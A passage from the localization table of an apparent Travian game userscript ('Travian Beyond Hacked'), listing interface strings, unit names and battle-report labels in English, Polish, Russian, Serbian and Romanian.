	'MINI': 'Mini',
	'ATT': 'Attacks',
	'CONS': 'Building',
	'FT': 'Party',
	'FT1': 'small party',
	'FT2': 'big party',
	'EXT': 'Extension',
	'IN': 'in',
	'JUGADOR': 'Player',
	'HAB': 'Population',
	'COORD': 'Coords',
	'ACCION': 'Actions',
	'MAPSCAN': 'Scan Map',
	'AID': 'Help',
	'VITS': 'Speed',
	'CAPA': 'Capacity',
	'DIST': 'Distance',
	'MP': 'To Bookmarks ',
	'UPDATE_CHECK': 'Skontroluj verziu',
	'LAST_VERSION': 'Máte poslednú verziu',
	'NEW_VERSION': 'Je novšia verzia',
	'UPDATE_NOW': 'Updatovať teraz?',
	'R1': 'Legionnár', // Romans
	'R2': 'Praetorian',
	'R3': 'Imperian',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Battering Ram',
	'R8': 'Ohnivý katapult',
	'R9': 'Senátor',
	'R10': 'Settler',
	'T1': 'Clubswinger', // Teutons
	'T2': 'Spearman',
	'T3': 'Axeman',
	'T4': 'Scout',
	'T5': 'Paladin',
	'T6': 'Teutonic Knight',
	'T7': 'Ram',
	'T8': 'Catapult',
	'T9': 'Chief',
	'T10': 'Settler',
	'G1': 'Phalanx', // Gauls
	'G2': 'Swordsman',
	'G3': 'Pathfinder',
	'G4': 'Theutates Thunder',
	'G5': 'Druidrider',
	'G6': 'Haeduan',
	'G7': 'Ram',
	'G8': 'Trebuchet',
	'G9': 'Chieftain',
	'G10': 'Settler',
	'N1': 'Rat', // Nature
	'N2': 'Spider',
	'N3': 'Serpent',
	'N4': 'Bat',
	'N5': 'Wild boar',
	'N6': 'Wolf',
	'N7': 'Bear',
	'N8': 'Crocodile',
	'N9': 'Tiger',
	'N10': 'Elephant',
	'LVL': 'level',			// Very important
	'MARC': 'Merchants',		// Very important
	'TOTAL': 'Total',
	'WASTED_SPACE': 'Wasted Space',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Important',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Text',
	'SAVEREPORT': 'save report',
	'ANONYMIZE': 'anonyme',
	'LBA0': 'Total size of attack',
	'LBA2': 'Total size of protection against infantry',
	'LBA3': 'Total size of protection against a cavalry',
	'LBA4': 'The general statistics',
	'LBA5': 'Difference of losses',
	'LBA6': 'Consumption',
	'LBA7': 'Exp of heroes',
	'LBA9': 'Equivalent lost in grain',
	'LBA10': 'Nominal consumption of grain by army',
	'LBA11': 'The hero was not',
	'LBA12': 'Hrdina',
	'LBA13': 'Quantity of the carried away raw material',
	'LBA14': 'The maximal capacity survived',
	'LBA15': 'Attacking',
	'LBA16': 'Defending',
	'LBA17': 'Copy and go to Combat simulator',
	'LBA18': 'Paste',
	'BBC': 'Useable BBcodes',
	'BBC_B': 'Bold: [b]Text[/b]',
	'BBC_I': 'Italic: [i]Text[/i]',
	'BBC_U': 'Underscore: [u]Text[/u]',
	'BBC_C': 'Center: [c]Text[/c]',
	'BBC_COLOR': 'Colors: [color=blue]Text[/color] Tipp: You can use these too: color=#0000FF and #00F',
	'BBC_URL': 'Link: [url]http://url[/url] or [url=http://url]Link text[/url]',
	'BBC_IMG': 'Image: [img]URL[/img]',
	'THS0': 'Current XP:',
	'THS1': 'Next Level:',
	'THS2': 'Needed:'
	};
	break;
	case "pl":		// emmperor : Polish language update by kisiel96
	var newLang = {
	'ALIANZA': 'Sojusz',
	'SIM': 'Symulator walki',
	'SEGURO': 'Jesteś pewny?',
	'MARK': 'Zaznacz wszystko',
	'PERDIDAS': 'Straty',
	'RENT': 'Zysk',
	'SUBIR_NIVEL': 'Możliwe',
	'ALDEA': 'Nazwa osady',
	'ATACAR': 'Atak',
	'COMERCIAR': 'Wyślij surowce',
	'GUARDADO': 'Zapisane',
	'DESP_ABR': 'Przes.',
	'FALTA': 'Potrzebujesz',
	'HOY': 'dzisiaj',
	'MANYANA': 'jutro',
	'PAS_MANYANA': 'pojutrze',
	'MERCADO': 'Rynek',
	'CUARTEL': 'Koszary',
	'PUNTO': 'Miejsce zbiórki',
	'CORRAL': 'Stajnia',
	'TALLER': 'Warsztat',
	'ENVIAR': 'Wyślij surowce',
	'COMPRAR': 'Kup',
	'VENDER': 'Sprzedaj',
	'ENVIAR_IGM': 'Wyślij PW',
	'LISTO': 'Możliwe',
	'EL': 'dnia',
	'A_LAS': 'o',
	'EFICIENCIA': 'Efektywność',
	'NUNCA': 'Nigdy',
	'PC': 'Punkty kultury',
	'FUNDAR': 'Możesz założyć lub podbić nową osadę',
	'TIEMPO': 'Czas',
	'STAT': 'Statystyka',
	'OFREZCO': 'Oferuję',
	'BUSCO': 'Szukam',
	'TIPO': 'Przelicznik',
	'CUALQUIERA': 'Dowolny',
	'DISPONIBLE': 'Tylko wybrane',
	'SI': 'Tak',
	'NO': 'Nie',
	'MARCADORES': 'Zakładki',
	'ANYADIR': 'Dodaj',
	'ENLACE': 'URL Nowej Zakładki',
	'TEXTO': 'Nazwa Nowej Zakładki',
	'ARCHIVE': 'Archiwum',
	'ELIMINAR': 'Usuń',
	'ACTUALIZAR': 'Aktualizuj',
	'REFRESH_INFORMARION': 'Aktualizuj Info',
	'RESUMEN': 'Podsumowanie',
	'RECURSO1': 'Drewno',
	'RECURSO2': 'Glina',
	'RECURSO3': 'Żelazo',
	'RECURSO4': 'Zboże',
	'ALDEA_EXTRA1': 'Wyślij jednostki',
	'ALDEA_EXTRA2': 'Wyślij surowce',
	'ALDEA_EXTRA3': 'Wycentruj na mapie',
	'ALDEA_EXTRA4': 'Widok globalny wioski',
	'ALDEA_EXTRA5': 'Wycentruj na wiosce',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Lokalizacja na Travmap',
	'ADD_ALL': 'Każdego ',
	'DEMO': 'Wyburz Budynek',
	'FRIGO': 'Frigo',
	'TOOLS': 'Odleglość i Czas',
	'TAB1': 'Dla lokalizacji na Travmap (czerwona kropka), oddzielasz rożne sojusze przecinkiem np: A,B,C',
	'TAB2': 'Edytuj własne zakładki',
	'TAB3': 'Notatnik',
	'TAB4': 'Price Sales Market',
	'TAB5': 'Tabelka z kopalniami',
	'TAB6': 'Tabelka z budynkami',
	'TAB7': 'Licznik surowców',
	'TAB8': 'Zakładki budynków administracyjnych',
	'TAB9': 'Zakładki budynków wojskowych',
	'TAB10': 'Zakładki budynków badań',
	'TAB11': 'Zakładki podsumowania osad',
	'TAB12': 'Pokaż Zakładki',
	'TAB13': 'Pokaż Info TSU',
	'TAB13B': 'Pokaż Info Travian World Analyzer',
	'TAB14': 'Pokaż Info Travian-search',
	'TAB15': 'Pokaż numery na budynkach',
	'TAB16': 'Pokaż zawartość wiadomości',
	'TAB17': 'Pokaż notatnik',
	'TAB18': 'Pokaz Info Travmap',
	'TAB19': 'Zakładka budynku Ratusz',
	'TAB20': 'Uproszczona lista linków z lewej strony',
	'TAB21': 'Uproszczone podsumowanie osad',
	'TAB22': 'Rozbudowane podsumowanie osad',
	'TAB23': 'Wybór ataku: Grabież/Normalny',
	'TAB24': 'Pozycja Licznika surowców',
	'TAB25': 'Pokaż wszystkie jednostki w osadzie (Miejsce Zbiórki)',
	'TAB26': 'Pokaż tabelke z podsumowaniem osad',
	'TAB27': 'Image server private : [ ]<br>Image server travian : [x]',
	'TAB28': 'ID stolicy np.: 13695\n<br>-> http:/*/dorf1.php?newdid=13695',
	'TAB29': 'Ikony szybkiej nawigacji',
	'TAB30': 'Pokaż Battle Analyse',
	'TAB31': 'Pokaż przyciski BBcode',
	'TAB32': 'Pokaż lvl budynków',
	'TAB33': 'Pokaż NPC Helper',
	'CLEAN': ' Wyczyść',
	'PAL': 'Pałac',
	'RESI': 'Rezydencja',
	'MAN': 'Dwór bohaterów',
	'USI': 'Kuźnia',
	'ARM': 'Zbrojownia',
	'HOT': 'Ratusz',
	'IGMTITLE': 'Temat',
	'IGMSENTER': 'nadawca',
	'IGMDATE': 'data',
	'IGMTIME': 'czas',
	'IGMOUTPUT': 'Pokaż zawartość listów',
	'MAXTIME': 'Maksymalny czas',
	'LOGIN': 'Login',
	'TT': 'Przegląd osad',
	'RESS': 'Magazyny',
	'DEP': 'Stan magazynów',
	'PC': 'PK',
	'TROP': 'Jednostki',
	'MINI': 'Mini',
	'ATT': 'Ataki',
	'CONS': 'Budynki',
	'FT': 'Święta',
	'FT1': 'Małe święto',
	'FT2': 'Duże święto',
	'EXT': 'Ekspansja',
	'IN': 'w',
	'JUGADOR': 'Gracz',
	'HAB': 'Populacja',
	'COORD': 'Koordynaty',
	'ACCION': 'Akcja',
	'MAPSCAN': 'Skanuj mape',
	'AID': 'Pomoc',
	'VITS': 'Speed',
	'CAPA': 'Udźwig',
	'DIST': 'Dystans',
	'MP': 'Do zakładek ',
	'UPDATE_CHECK': 'Sprawdź aktualizację',
	'LAST_VERSION': 'Posiadasz najnowszą wersję',
	'NEW_VERSION': 'Nowa wersja jest dostępna',
	'UPDATE_NOW': 'Aktualizuj teraz',
	'R1': 'Legionista', //romain
	'R2': 'Pretorianin',
	'R3': 'Centurion',
	'R4': 'Equites Legati',
	'R5': 'Equites Imperatoris',
	'R6': 'Equites Caesaris',
	'R7': 'Taran',
	'R8': 'Ognista Katapulta',
	'R9': 'Konsul',
	'R10': 'Osadnik',
	'T1': 'Pałkarz', //teuton
	'T2': 'Oszczepnik',
	'T3': 'Topornik',
	'T4': 'Zwiadowca',
	'T5': 'Palladyn',
	'T6': 'Germański Rycerz',
	'T7': 'Taran',
	'T8': 'Katapulta',
	'T9': 'Wódz',
	'T10': 'Osadnik',
	'G1': 'Falanga', //gaulois
	'G2': 'Miecznik',
	'G3': 'Tropiciel',
	'G4': 'Grom Teutatesa',
	'G5': 'Jeździec Druidzki',
	'G6': 'Haeduan',
	'G7': 'Taran',
	'G8': 'Trebusz',
	'G9': 'Herszt',
	'G10': 'Osadnicy',
	'N1': 'Szczur', //nature
	'N2': 'Pająk',
	'N3': 'Wąż',
	'N4': 'Nietoperz',
	'N5': 'Dzik',
	'N6': 'Wilk',
	'N7': 'Niedźwiedź',
	'N8': 'Krokodyl',
	'N9': 'Tygrys',
	'N10': 'Słoń',
	'LVL': 'Poziom',		//tres important
	'MARC': 'Handlowcy',	//tres important
	'TOTAL': 'Łącznie',
	'WASTED_SPACE' : 'Zmarnowane miejsce ',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Important',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Text',
	'SAVEREPORT': 'zapisz raport',
	'ANONYMIZE': 'anonimowy',
	'LBA0': 'Suma ataku',
	'LBA1': 'Equivalent des pertes',
	'LBA2': 'Suma ataku piechoty',
	'LBA3': 'Suma ataku kawalerii',
	'LBA4': 'Statystyki',
	'LBA5': 'Stracone surowce',
	'LBA6': 'Zużycie zboża',
	'LBA7': 'Doświadczenie dla bohatera',
	'LBA8': 'Udźwig',
	'LBA9': 'Surowce stracone w grabieży',
	'LBA10': 'Zboże zjadane przez armię',
	'LBA11': 'Bohater nie uczestniczył w bitwie',
	'LBA12': 'Bohater',
	'LBA13': 'Zgrabione surowce',
	'LBA14': 'Maksymalny udźwig',
	'LBA15': 'Napastnik',
	'LBA16': 'Obrońca',
	'LBA17': 'Skopiuj i przejdź do symulatora walk',
	'LBA18': 'Wklej',
	'BBC': 'Tagi BBcode',
	'BBC_B': 'Pogrubienie: [b]Text[/b]',
	'BBC_I': 'Kursywa: [i]Text[/i]',
	'BBC_U': 'Podkreślenie: [u]Text[/u]',
	'BBC_C': 'Centrowanie: [c]Text[/c]',
	'BBC_COLOR': 'Kolory: [color=blue]Tekst[/color] Porada: Możesz także użyć: color=#0000FF i #00F',
	'BBC_URL': 'Link: [url]http://url[/url] lub [url=http://url]Tekst wyświetlany zamiast linku[/url]',
	'BBC_IMG': 'Obrazek: [img]URL[/img]'
	}
	break;
	case "ru":		// Russe : Для начала, А дальше по факту смотреть надо.
	var newLang = {
	'ALIANZA': 'Альянс',
	'SIM': 'Симулятор боя',
	'SEGURO': 'Вы уверены?',
	'MARK': 'Выбрать все',
	'PERDIDAS': 'Потери',
	'RENT': 'Доход',
	'SUBIR_NIVEL': 'Повысить уровень',
	'ALDEA': 'по деревням',
	'ATACAR': 'Атаковать',
	'COMERCIAR': 'Отправить ресурсы',
	'GUARDADO': 'Настройки сохранены!',
	'DESP_ABR': 'Пер.',
	'FALTA': 'Требуется',
	'HOY': 'сегодня',
	'MANYANA': 'завтра',
	'PAS_MANYANA': 'послезавтра',
	'MERCADO': 'Рынок',
	'CUARTEL': 'Казарма',
	'PUNTO': 'Пункт сбора',
	'CORRAL': 'Конюшня',
	'TALLER': 'Мастерская',
	'ENVIAR': 'Отправить ресурсы',
	'COMPRAR': 'Покупка',
	'VENDER': 'Продажа',
	'ENVIAR_IGM': 'Послать IGM',
	'LISTO': 'Готово',
	'EL': 'в',
	'A_LAS': 'в',
	'EFICIENCIA': 'Эффективность',
	'NUNCA': 'Никогда',
	'PC': 'Единицы культуры',
	'FUNDAR': 'Вы можете основать или завоевать новую деревню',
	'TIEMPO': 'Время',
	'STAT': 'Статистика',
	'OFREZCO': 'Предлагаю',
	'BUSCO': 'Искать',
	'TIPO': 'Тип',
	'CUALQUIERA': 'Любой',
	'DISPONIBLE': 'Только доступные (по количеству торговцев)',
	'SI': 'Да',
	'NO': 'Нет',
	'MARCADORES': 'Закладки',
	'ANYADIR': 'Добавить',
	'ENLACE': 'Введите URL закладки',
	'TEXTO': 'Введите имя закладки',
	'ARCHIVE': 'Архив',
	'ELIMINAR': 'Удалить',
	'ACTUALIZAR': 'Обновить',
	'REFRESH_INFORMARION': 'Обновить',
	'RESUMEN': 'Сводка',
	'RECURSO1': 'Дерево',
	'RECURSO2': 'Глина',
	'RECURSO3': 'Железо',
	'RECURSO4': 'Зерно',
	'ALDEA_EXTRA1': 'Послать войска',
	'ALDEA_EXTRA2': 'Отправить ресурсы',
	'ALDEA_EXTRA3': 'Центровать карту',
	'ALDEA_EXTRA4': 'View Global on village',
	'ALDEA_EXTRA5': 'Центровать на деревне',
	'ALDEA_EXTRA6': 'Информация с TSU',
	'ALDEA_EXTRA6B': 'Информация с Travian World Analyzer',
	'ALDEA_EXTRA7': 'Информация с Travian-search',
	'ALDEA_EXTRA8': 'Расположение на Travmap',
	'ADD_ALL': 'Каждого ресурса по ',
	'DEMO': 'Снести здание',
	'FRIGO': 'Неактивные',
	'TOOLS': 'Расстояние-время',
	'TAB1': 'Для отображения на Travmap (красная иконка) нескольких альянсов, ведите их названия через запятую.(напр.: A,B,C)',
	'TAB2': 'Редактировать закладки',
	'TAB3': 'Содержимое блокнота',
	'TAB4': 'Свои предложения на рынке',
	'TAB5': 'Таблица апгрейда шахт и ферм внизу страницы (0 или 1)',
	'TAB6': 'Таблица апгрейда внутренних зданий внизу страницы (0 или 1)',
	'TAB7': 'Отображать счётчики ресурсов (0 или 1)',
	'TAB8': 'Закладки: дворец и резиденция (0 или 1)',
	'TAB9': 'Закладки: каразма, конюшня и мастерская (0 или 1)',
	'TAB10': 'Закладки: кузницы оружия и доспехов (0 или 1)',
	'TAB11': 'Закладки: таверна (0 или 1)',
	'TAB12': 'Показывать закладки',
	'TAB13': 'Показывать ссылку на TSU (0 или 1)',
	'TAB13B': 'Показывать ссылку на Travian World Analyzer (0 или 1)',
	'TAB14': 'Показывать ссылку на Travian-search (0 или 1)',
	'TAB15': 'Показывать уровни зданий внутри деревни (0 или 1)',
	'TAB16': 'Показывать текст всех сообщений (0 или 1)',
	'TAB17': 'Показывать блокнот (0 или 1)',
	'TAB18': 'Показывать ссылку на Travmap (0 или 1)',
	'TAB19': 'Закладки: ратуша (0 или 1)',
	'TAB20': 'Сокращённый перечень ссылок в левой части страницы (0 или 1)',
	'TAB21': 'Упрощённый вид статистики в сводке по деревням (0 или 1)',
	'TAB22': 'Переместить наверх таблицу статистики в сводке по деревням (0 или 1)',
	'TAB23': 'Нападение: Набег / Нападение: обычное (0 или 1)',
	'TAB24': 'Положение счетчика ресурсов снизу / сверху (0 или 1)',
	'TAB25': 'Показывать общие количество войск в деревне (пункт сбора) (0 или 1)',
	'TAB26': 'Таблица краткого обзора дереневь (0 или 1)',
	'CLEAN': ' Очистить',
	'PAL': 'Дворец',
	'RESI': 'Резиденция',
	'MAN': 'Таверна',
	'USI': 'Кузница доспехов',
	'ARM': 'Кузница оружия',
	'HOT': 'Ратуша',
	'IGMTITLE': 'Тема',
	'IGMSENTER': 'Отправитель',
	'IGMDATE': 'Дата',
	'IGMTIME': 'Время',
	'IGMOUTPUT': 'Текст всех сообщений',
	'MAXTIME': 'Максимальное время',
	'LOGIN': 'Вход',
	'TT': 'Обзор',
	'RESS': 'Ресурсы на складах',
	'DEP': 'Склады (%)',
	'PC': 'ЕК',
	'TROP': 'Войска',
	'MINI': 'Мини-обзор',
	'ATT': 'Атаки',
	'CONS': 'Строительство',
	'FT': 'Праздники',
	'FT1': 'Праздник',
	'FT2': 'Торжество',
	'EXT': 'Длительность',
	'IN': 'в',
	'JUGADOR': 'Игрок',
	'HAB': 'Население',
	'COORD': 'Координаты',
	'ACCION': 'Действия',
	'MAPSCAN': 'Сканировать карту',
	'AID': 'Помощь',
	'VITS': 'Скорость',
	'CAPA': 'Вместимость',
	'DIST': 'Расстояние',
	'MP': 'К Закладкам ',
	'UPDATE_CHECK': 'Проверить версию',
	'LAST_VERSION': 'Вы используете последнюю версию',
	'NEW_VERSION': 'Есть новая версия',
	'UPDATE_NOW': 'Обновить сейчас',
	'R1': 'Легионер', // Romans
	'R2': 'Преторианец',
	'R3': 'Империанец',
	'R4': 'Конный Разведчик',
	'R5': 'Конница императора',
	'R6': 'Конница Цезаря',
	'R7': 'Таран',
	'R8': 'Огненная катапульта',
	'R9': 'Сенатор',
	'R10': 'Поселенец',
	'T1': 'Дубинщик', // Teutons
	'T2': 'Копьеносец',
	'T3': 'Топорщик',
	'T4': 'Скаут',
	'T5': 'Паладин',
	'T6': 'Тевтонская конница',
	'T7': 'Стенобитное орудие',
	'T8': 'Катапульта',
	'T9': 'Вождь',
	'T10': 'Поселенец',
	'G1': 'Фаланга', // Gauls
	'G2': 'Мечник',
	'G3': 'Следопыт',
	'G4': 'Тевтатский гром',
	'G5': 'Друид-всадник',
	'G6': 'Эдуйская конница',
	'G7': 'Таран',
	'G8': 'Требучет',
	'G9': 'Предводитель',
	'G10': 'Поселенец',
	'N1': 'Крыса', // Nature
	'N2': 'Паук',
	'N3': 'Змея',
	'N4': 'Летучая мышь',
	'N5': 'Кабан',
	'N6': 'Волк',
	'N7': 'Медведь',
	'N8': 'Крокодил',
	'N9': 'Тигр',
	'N10': 'Слон',
	'LVL': 'уровень',
	'MARC': 'Торговцы'
	}
	break;
	case "rs": //serbian translation
	var newLang = {
	'ALIANZA': 'Савез',
	'SIM': 'Симулатор борбе',
	'SEGURO': 'Да ли сте сигурни?',
	'MARK': 'Изабери све',
	'PERDIDAS': 'Изгубљено сировина',
	'RENT': 'Профит',
	'SUBIR_NIVEL': 'Надоградња могућа',
	'ALDEA': '',
	'ATACAR': 'Напад',
	'COMERCIAR': 'Пошаљи сировине',
	'GUARDADO': 'Снимљено',
	'DESP_ABR': 'Померај',
	'FALTA': 'Потребно ти је',
	'HOY': 'данас',
	'MANYANA': 'сутра',
	'PAS_MANYANA': 'прекосутра',
	'MERCADO': 'Пијаца',
	'CUARTEL': 'Касарна',
	'PUNTO': 'Место окупљања',
	'CORRAL': 'Штала',
	'TALLER': 'Радионица',
	'ENVIAR': 'Пошаљи сировине',
	'COMPRAR': 'Куповина',
	'VENDER': 'Продаја',
	'ENVIAR_IGM': 'Пошаљи поруку',
	'LISTO': 'Спреман',
	'EL': 'за',
	'A_LAS': 'у',
	'EFICIENCIA': 'Ефикасност',
	'NUNCA': 'Никада',
	'PC': 'културних поена',
	'FUNDAR': 'Можете освојити или основати ново село',
	'TIEMPO': 'Време',
	'STAT': 'Статистика',
	'OFREZCO': 'Нуди',
	'BUSCO': 'Тражи',
	'TIPO': 'Тип',
	'CUALQUIERA': 'Све',
	'DISPONIBLE': 'Само доступно',
	'SI': 'Да',
	'NO': 'Не',
	'MARCADORES': 'Линкови',
	'ANYADIR': 'Додај',
	'ENLACE': 'URL новог линка',
	'TEXTO': 'Назив новог линка',
	'ARCHIVE': 'Архива',
	'ELIMINAR': 'Избриши',
	'ACTUALIZAR': 'освежи',
	'REFRESH_INFORMARION': 'Освежи информације',
	'RESUMEN': 'Збирно',
	'RECURSO1': 'дрво',
	'RECURSO2': 'глина',
	'RECURSO3': 'гвожђе',
	'RECURSO4': 'жито',
	'ALDEA_EXTRA1': 'Пошаљи војску',
	'ALDEA_EXTRA2': 'Пошаљи сировине',
	'ALDEA_EXTRA3': 'Центрирај карту овде',
	'ALDEA_EXTRA4': 'Погледај село',
	'ALDEA_EXTRA5': 'Центрирај карту овде',
	'ALDEA_EXTRA6': 'Инфо TSU',
	'ALDEA_EXTRA6B': 'Инфо Travian World Analyzer',
	'ALDEA_EXTRA7': 'Инфо Travian-search',
	'ALDEA_EXTRA8': 'Локација на Travmap',
	'ADD_ALL': 'За све ',
	'DEMO': 'Главна зграда',
	'FRIGO': 'Неактивни',
	'TOOLS': 'Даљине и времена',
	'TAB1': 'За приказ на Travmap можете раздвојти више савеза зарезом (пример: A,B,C)',
	'TAB2': 'Едитуј линкове',
	'TAB3': 'Бележница',
	'TAB4': 'Продајне цене на пијаци',
	'TAB5': 'Инфо надоградње сировине',
	'TAB6': 'Инфо надоградње грађевине',
	'TAB7': 'Време пуњења/пражњења складишта/силоса',
	'TAB8': 'Линкови на административне грађевине',
	'TAB9': 'Линкови на војне грађевине',
	'TAB10': 'Линкови на грађевине за унапређење',
	'TAB11': 'Прилагођени линкови',
	'TAB12': 'Прикажи линкове',
	'TAB13': 'Прикажи инфо TSU',
	'TAB13B': 'Прикажи инфо Travian World Analyzer',
	'TAB14': 'Прикажи инфо Travian-search',
	'TAB15': 'Прикази степен грађевине',
	'TAB16': 'Прикажи садржај порука',
	'TAB17': 'Прикажи бележницу',
	'TAB18': 'Прикажи инфо Travmap',
	'TAB19': 'Линк на општину',
	'TAB20': 'Поједностави листу линкова на левој страни',
	'TAB21': 'Пoједностави збирни преглед села',
	'TAB22': 'Премести збирни преглед села',
	'TAB23': 'Пљачка / Напад',
	'TAB24': 'Премести време пуњења/пражњења',
	'TAB25': 'Прикажи укупан број трупа из села (место окупљања)',
	'TAB26': 'Прикажи преглед села',
	'TAB27': 'Слике са приватног сервера : [ ]<br>Слике са травиан сервера : [x]',
	'TAB28': 'Унеси ИД главног града ID (ex: 13695)\n<br>-> http://-/dorf1.php?newdid=13695',
	'TAB29': 'Прикажи додатне иконе',
	'TAB30': 'Прикажи анализу битке',
	'TAB31': 'Прикажи помоћ за BBCode',
	'TAB32': 'Прикажи степен поља/рудника',
	'TAB33': 'Прикажи НПЦ помоћника',
	'TAB34': 'Прикажи брѕи иѕвешатај',
	'TAB35': 'Одреди брзину јединица за прозор са даљинама (пр. за сенатора: 4)',
	'CLEAN': ' Избриши',
	'PAL': 'Палата',
	'RESI': 'Резиденција',
	'MAN': 'Дворац хероја',
	'USI': 'Ковачница оклопа',
	'ARM': 'Ковачница оружја',
	'HOT': 'Општина',
	'IGMTITLE': 'Тема',
	'IGMSENTER': 'Пошиљалац',
	'IGMDATE': 'датум',
	'IGMTIME': 'време',
	'IGMOUTPUT': 'Прикажи садржај порука',
	'MAXTIME': 'Максимално време',
	'LOGIN': 'Име',
	'TT': 'Преглед',
	'RESS': 'Сировине',
	'DEP': 'Складиште',
	'PC': 'КП',
	'TROP': 'Војска',
	'MINI': 'Мини',
	'ATT': 'Напад',
	'CONS': 'Изградња',
	'FT': 'Забаве',
	'FT1': 'Мала забава',
	'FT2': 'Велика забава',
	'EXT': 'Проширење',
	'IN': '',
	'JUGADOR': 'Играч',
	'HAB': 'Становништво',
	'COORD': 'Координате',
	'ACCION': 'Акција',
	'MAPSCAN': 'Претражи мапу',
	'AID': 'Помоћ',
	'VITS': 'Брзина',
	'CAPA': 'Капацитет',
	'DIST': 'Даљина',
	'MP': 'Додај у линкове',
	'UPDATE_CHECK': 'Провери верзију',
	'LAST_VERSION': 'Користите последњу верзију',
	'NEW_VERSION': 'Нова верзија је доступна',
	'UPDATE_NOW': 'Унапреди сада',
	'R1': 'Легионар', // Romans
	'R2': 'Преторијанац',
	'R3': 'Империјанац',
	'R4': 'Извиђач',
	'R5': 'Императорова коњица',
	'R6': 'Цезарева коњица',
	'R7': 'Ован',
	'R8': 'Ватрени катапулт',
	'R9': 'Сенатор',
	'R10': 'Насељеник',
	'T1': 'Батинар',	// Teutons
	'T2': 'Копљаник',
	'T3': 'Секираш',
	'T4': 'Извиђач',
	'T5': 'Паладин',
	'T6': 'тевтонски витез',
	'T7': 'Ован',
	'T8': 'Катапулт',
	'T9': 'Поглавица',
	'T10': 'Насељеник',
	'G1': 'Фаланга',	// Gauls
	'G2': 'Мачевачац',
	'G3': 'Извиђач',
	'G4': 'Галски витез',
	'G5': 'Друид',
	'G6': 'Коњаник',
	'G7': 'Ован',
	'G8': 'Катапулт',
	'G9': 'Старешина',
	'G10': 'Насељеник',
	'N1': 'Пацов',	// Nature
	'N2': 'Паук',
	'N3': 'Змија',
	'N4': 'Слепи мип',
	'N5': 'Дивља свиња',
	'N6': 'Вук',
	'N7': 'Медвед',
	'N8': 'Крокодил',
	'N9': 'Тигар',
	'N10': 'Слон',
	'LVL': 'степен',		// Very important
	'MARC': 'Трговац',		// Very important
	'TOTAL': 'Укупно',
	'WASTED_SPACE': 'Неискоришћено',
	'TBH_SETUP_I': 'Travian Beyond Hacked : Важно (0/1)',
	'TBH_SETUP_T': 'Travian Beyond Hacked : Текст',
	'SAVEREPORT': 'Сними извештај',
	'ANONYMIZE': 'Сакри податке',
	'LBA0':'Јачина напада',
	'LBA2':'Укупна одбрана од пешадије',
	'LBA3':'Укупна одбрана од коњице',
	'LBA4':'Статистика',
	'LBA5':'Однос губитака',
	'LBA6':'Потрошња жита',
	'LBA7':'Искуство хероја',
	'LBA9':'Губитак у житу',
	'LBA10':'Потрошња жита за исхрану војске',
	'LBA11':'Херој није добио ништа',
	'LBA12':'Херој',
	'LBA13':'Количина опљачканих сировина',
	'LBA14':'Максимална количина коју могу да понесу преживели',
	'LBA15':'Нападач',
	'LBA16':'Бранилац',
	'LBA17': 'Копирај и отвори симулатор битке',
	'LBA18': 'Убаци копирано',
	'BBC': 'Корисни ББкодови',
	'BBC_B': 'Зацрњено: [b]Текст[/b]',
	'BBC_I': 'Косо: [i]Текст[/i]',
	'BBC_U': 'Подвучено: [u]Текст[/u]',
	'BBC_C': 'Центрирано: [c]Текст[/c]',
	'BBC_COLOR': 'Боја: [color=blue]Текст[/color] Tipp: You can use these too: color=#0000FF and #00F',
	'BBC_URL': 'Линк: [url]http://url[/url] or [url=http://url]Назив линка[/url]',
	'BBC_IMG': 'Слика: [img]URL[/img]',
	'THS0': 'Тренутно ЕП:',
	'THS1': 'Следећи ниво:',
	'THS2': 'Потребно:'
	}
	break;
	case "ro":		// Napkin | Atomic | Viorakis : Romanian language
	var newLang = {
	'ALIANZA': 'Alianţa',
	'SIM': 'Simulator luptă',
	'SEGURO': 'Eşti sigur?',
	'MARK': 'Selectează tot',
	'PERDIDAS': 'Pierderi',
	'RENT': 'Profit',
	'SUBIR_NIVEL': 'Extindere posibilă',
	'ALDEA': 'Numele satului',
	'ATACAR': 'Atacă',
	'COMERCIAR': 'Trimite resurse',
	'GUARDADO': 'Salvat',
	'DESP_ABR': 'Mov.',
	'FALTA': 'Ai nevoie de',
	'HOY': 'azi',
	'MANYANA': 'mâine',
	'PAS_MANYANA': 'poimâine',
	'MERCADO': 'Piaţă',
	'CUARTEL': 'Cazarma',
	'PUNTO': 'Adunare',
	'CORRAL': 'Grajd',
	'TALLER': 'Atelier',
	'ENVIAR': 'Trimite resurse',
	'COMPRAR': 'Cumpără',
	'VENDER': 'Vinde',
	'ENVIAR_IGM': 'Trimite IGM',
	'LISTO': 'Gata',
	'EL': 'pe',
	'A_LAS': 'la',
	'EFICIENCIA': 'Eficienţă',
	'NUNCA': 'Niciodată',
	'PC': 'Puncte de cultură',
	'FUNDAR': 'Poţi întemeia sau cuceri alt sat',
	'TIEMPO': 'Timp',
	'STAT': 'Statistic',
	'OFREZCO': 'Ofertă',
	'BUSCO': 'Caută',
	'TIPO': 'Fel',
	'CUALQUIERA': 'Oricare',
	'DISPONIBLE': 'Disponibil doar',
	'SI': 'Da',
	'NO': 'Nu',
	'MARCADORES': 'Scurtături',
	'ANYADIR': 'Adaugă',
	'ENLACE': 'Scurtături URL',
	'TEXTO': 'Scurtături Text',
	'ARCHIVE': 'Arhivă',
	'ELIMINAR': 'Şterge',
	'ACTUALIZAR': 'Actualizează',
	'REFRESH_INFORMARION': 'Actualizare Info',
	'RESUMEN': 'Rezumat',
	'RECURSO1': 'Lemn',
	'RECURSO2': 'Lut',
	'RECURSO3': 'Fier',
	'RECURSO4': 'Hrană',
	'ALDEA_EXTRA1': 'Trimite unităţile',
	'ALDEA_EXTRA2': 'Trimite resurse',
	'ALDEA_EXTRA3': 'Centrează harta',
	'ALDEA_EXTRA4': 'Vedere globală a satului',
	'ALDEA_EXTRA5': 'Centrul satului',
	'ALDEA_EXTRA6': 'Info TSU',
	'ALDEA_EXTRA6B': 'Info Travian World Analyzer',
	'ALDEA_EXTRA7': 'Info Travian-search',
	'ALDEA_EXTRA8': 'Localizare in Travmap',
	'ADD_ALL': 'Pentru toţi ',
	'DEMO': 'Demolează',
